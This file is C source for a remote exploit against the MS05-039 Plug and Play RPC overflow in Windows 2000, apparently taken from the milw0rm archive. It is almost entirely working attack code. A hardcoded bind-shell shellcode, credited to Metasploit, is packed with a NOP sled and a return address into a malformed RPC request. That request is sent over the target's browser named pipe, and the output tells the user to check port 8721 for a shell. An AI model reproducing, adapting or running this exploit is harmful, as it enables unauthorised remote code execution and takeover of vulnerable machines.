/*
Windows 2000 universal exploit for MS05-039
-\x6d\x35\x6c\x30\x6e\x6e\x79-
*/

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winnetwk.h>
#include <winsock.h>
#include <Rpc.h>
#include <wchar.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")

BYTE Data1[0x68] =
{0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,
 0x52,0x00,0x4F,0x00,0x4F,0x00,0x54,0x00,0x5C,0x00,0x53,0x00,
 0x59,0x00,0x53,0x00,0x54,0x00,0x45,0x00,0x4D,0x00,0x5C,0x00,
 0x30,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x00,0x00,0x00,0x00,
 0xFF,0xFF,0x00,0x00,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
 0x00,0x00,0x00,0x00,0xEE,0xEE,0xEE,0xEE,0x00,0x00,0x00,0x00,
 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x21,0x00,0x00,0x00,
 0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
struct DataStruct1
{
       BYTE SomeString[0x30];
       DWORD RESDataType;
       DWORD LFD;
       DWORD SDM1;
       DWORD SDO;
       DWORD SDL;
       DWORD SDM2;
       BYTE  SDA[0x07D0];
       DWORD LRD;
       DWORD MB;
       DWORD DM;
};
struct RPCBIND
{
       BYTE VerMaj;
       BYTE VerMin;
       BYTE PacketType;
       BYTE PacketFlags;
       DWORD DataRep;
       WORD FragLength;
       WORD AuthLength;
       DWORD CallID;
       WORD MaxXmitFrag;
       WORD MaxRecvFrag;
       DWORD AssocGroup;
       BYTE NumCtxItems;
       WORD ContextID;
       WORD NumTransItems;
       GUID InterfaceUUID;
       WORD InterfaceVerMaj;
       WORD InterfaceVerMin;
       GUID TransferSyntax;
       DWORD SyntaxVer;
};
//from metasploit, before you were born
BYTE BindShell[374]={"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"
"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"
"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"
"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"
"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"
"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"
"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x8e"
"\x4e\x0e\xec\xff\xd6\x89\xc7\x81\xec\x00\x01\x00\x00\x57\x56\x53"
"\x89\xe5\xe8\x27\x00\x00\x00\x90\x01\x00\x00\xb6\x19\x18\xe7\xa4"
"\x19\x70\xe9\xe5\x49\x86\x49\xa4\x1a\x70\xc7\xa4\xad\x2e\xe9\xd9"
"\x09\xf5\xad\xcb\xed\xfc\x3b\x57\x53\x32\x5f\x33\x32\x00\x5b\x8d"
"\x4b\x20\x51\xff\xd7\x89\xdf\x89\xc3\x8d\x75\x14\x6a\x07\x59\x51"
"\x53\xff\x34\x8f\xff\x55\x04\x59\x89\x04\x8e\xe2\xf2\x2b\x27\x54"
"\xff\x37\xff\x55\x30\x31\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff"
"\x55\x2c\x89\xc7\x31\xdb\x53\x53\x68\x02\x00\x22\x11\x89\xe0\x6a"
"\x10\x50\x57\xff\x55\x24\x53\x57\xff\x55\x28\x53\x54\x57\xff\x55"
"\x20\x89\xc7\x68\x43\x4d\x44\x00\x89\xe3\x87\xfa\x31\xc0\x8d\x7c"
"\x24\xac\x6a\x15\x59\xf3\xab\x87\xfa\x83\xec\x54\xc6\x44\x24\x10"
"\x44\x66\xc7\x44\x24\x3c\x01\x01\x89\x7c\x24\x48\x89\x7c\x24\x4c"
"\x89\x7c\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49"
"\x51\x51\x53\x51\xff\x75\x00\x68\x72\xfe\xb3\x16\xff\x55\x04\xff"
"\xd0\x89\xe6\xff\x75\x00\x68\xad\xd9\x05\xce\xff\x55\x04\x89\xc3"
"\x6a\xff\xff\x36\xff\xd3\xff\x75\x00\x68\x7e\xd8\xe2\x73\xff\x55"
"\x04\x31\xdb\x53\xff\xd0"};
BYTE PRPC[0x48] =
{0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
 0xB8,0x10,0xB8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
 0x6A,0x28,0x19,0x39,0x0C,0xB1,0xD0,0x11,0x9B,0xA8,0x00,0xC0,0x4F,0xD9,0x2E,0xF5,
 0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
 0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};
struct RPCFUNC
{
       BYTE VerMaj;
       BYTE VerMin;
       BYTE PacketType;
       BYTE PacketFlags;
       DWORD DataRep;
       WORD FragLength;
       WORD AuthLength;
       DWORD CallID;
       DWORD AllocHint;
       WORD ContextID;
       WORD Opnum;
};
BYTE POP[0x27] =
{0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xAC,0x10,0x00,0x00,0x01,0x00,0x00,0x00,
 0x94,0x10,0x00,0x00,0x00,0x00,0x09,0x00,0x05,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
 0x05,0x08,0x00,0x00,0x41,0x00,0x41};

int BindRpcInterface(HANDLE PH, char *Interface, char *InterfaceVer)
{
       BYTE rbuf[0x1000];
       DWORD dw;
       struct RPCBIND RPCBind;

       memcpy(&RPCBind,&PRPC,sizeof(RPCBind));
       UuidFromString(Interface,&RPCBind.InterfaceUUID);
       UuidToString(&RPCBind.InterfaceUUID,&Interface);
       RPCBind.InterfaceVerMaj=atoi(&InterfaceVer[0]);
       RPCBind.InterfaceVerMin=atoi(&InterfaceVer[2]);
       TransactNamedPipe(PH, &RPCBind, sizeof(RPCBind), rbuf, sizeof(rbuf), &dw, NULL);
       return 0;
}

int Attack(HANDLE PipeHandle)
{
       struct RPCFUNC RPCOP;
       int bwritten=0;
       BYTE *LargeBuffer;
       BYTE rbuf[0x100];
       DWORD dw;
       struct DataStruct1 EvilRPC;

       memcpy(&EvilRPC,&Data1,sizeof(EvilRPC));
       EvilRPC.SDL=0x07C0;
       memset(EvilRPC.SDA,0x90,0x07D0);
       EvilRPC.SDA[76]=0x3e;
       EvilRPC.SDA[77]=0x1e;
       EvilRPC.SDA[78]=0x02;
       EvilRPC.SDA[79]=0x75;
       memset(EvilRPC.SDA+80,0x90,10);
       EvilRPC.SDA[90]=0x90;
       memcpy(EvilRPC.SDA+94,BindShell,374);
       EvilRPC.MB=0x00000004;
       EvilRPC.DM=0x00000000;
       EvilRPC.LFD=0x000007E0;
       EvilRPC.LRD=0x000007E0;
       memcpy(&RPCOP,&POP,sizeof(RPCOP));
       RPCOP.Opnum = 54;
       RPCOP.FragLength=sizeof(RPCOP)+sizeof(EvilRPC);
       RPCOP.AllocHint=sizeof(EvilRPC);
       LargeBuffer=malloc(sizeof(RPCOP)+sizeof(EvilRPC));
       memset(LargeBuffer,0x00,sizeof(RPCOP)+sizeof(EvilRPC));
       memcpy(LargeBuffer,&RPCOP,sizeof(RPCOP));
       memcpy(LargeBuffer+sizeof(RPCOP),&EvilRPC,sizeof(EvilRPC));
       printf("Sending payload...\nThis has to time out... ctrl+c after 5 secs\ncheck for shell on port 8721");
       TransactNamedPipe(PipeHandle, LargeBuffer, sizeof(RPCOP)+sizeof(EvilRPC), rbuf, sizeof(rbuf), &dw, NULL);
       free(LargeBuffer);
       return 0;
}


int main(int argc, char* argv[])
{
       char *server;
       NETRESOURCE nr;
       char unc[MAX_PATH];
       char szPipe[MAX_PATH];
       HANDLE hFile;

       if (argc < 2)
       {
               printf("Usage: %s <host>\n", argv[0]);
               return 1;
       }
       server=argv[1];
       _snprintf(unc, sizeof(unc), "\\\\%s\\pipe", server);
       unc[sizeof(unc)-1] = 0;
       nr.dwType       = RESOURCETYPE_ANY;
       nr.lpLocalName  = NULL;
       nr.lpRemoteName = unc;
       nr.lpProvider   = NULL;
       WNetAddConnection2(&nr, "", "", 0);

       _snprintf(szPipe, sizeof(szPipe), "\\\\%s\\pipe\\browser",server);
       hFile = CreateFile(szPipe, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

       BindRpcInterface(hFile,"8d9f4e40-a03d-11ce-8f69-08003e30051b","1.0");

       //SendMalformed RPC request
       Attack(hFile);
       return 0;
}

// milw0rm.com [2005-08-11]